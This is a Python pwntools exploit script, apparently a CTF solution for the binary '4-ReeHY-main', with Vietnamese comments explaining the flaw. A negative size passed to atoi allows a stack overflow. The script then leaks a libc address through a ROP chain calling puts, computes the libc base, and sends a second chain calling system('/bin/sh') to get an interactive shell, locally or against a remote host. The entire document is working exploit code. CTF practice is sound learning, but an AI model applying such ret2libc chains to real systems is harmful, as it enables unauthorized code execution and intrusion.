from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
b* 0x400a6e
b* 0x400b20
continue
'''.format(**locals())

#Binary filename
exe = './4-ReeHY-main'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()
libc = ELF("./libc6_2.23-0ubuntu11_amd64.so")

'''
Bai nay co 2 cach la ROP va dung unlink attack
Voi ROP:
- Vi no dung ham atoi va ko check nen neu chung ta dien so am vao thi ta co
the nhap vo han o ham Create() => Buffer Overflow
- Nhung chung ta khong the nhap thang junk 0x98 bytes vao duoc vi co cho check
ben duoi $rbp nen ta phai de stack duoi $rbp la 0
- Cuoi cung la dung RopGadget de lay dia chi ham va thuc hien lai khi da co dia 
chi base cua libc 
'''

def create(size, cun, data):
    p.sendlineafter('$ ', '1')
    p.sendlineafter('Input size\n', str(size))
    p.sendlineafter('Input cun\n', str(cun))
    p.sendlineafter('Input content\n', (data))

def delete(cun):
    p.sendlineafter('$ ', '2')
    p.sendlineafter('Chose one to dele\n', str(cun))

def edit(cun, data):
    p.sendlineafter('$ ', '3')
    p.sendlineafter("Chose one to edit\n", str(cun))
    p.sendlineafter("Input the content\n", data)

main_addr = 0x400c8c
pop_rdi = 0x400da3
p.sendlineafter("$ ", "TheHoods")
leak_head = b"a" * 0x88 + p64(0) +b"a" * 8
payload = leak_head + p64(pop_rdi) + p64(elf.got.atoi) + p64(elf.plt.puts)
payload += p64(main_addr)
create(-1, 0, payload)

leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("leak = "+ hex(leak))
libc.address = leak - libc.sym['atoi']
log.info("libc = " + hex(libc.address))

p.sendlineafter("$ ", "TheHoods2")
payload = leak_head + p64(pop_rdi) + p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.sym['system'])
create(-1, 0, payload)
p.interactive()
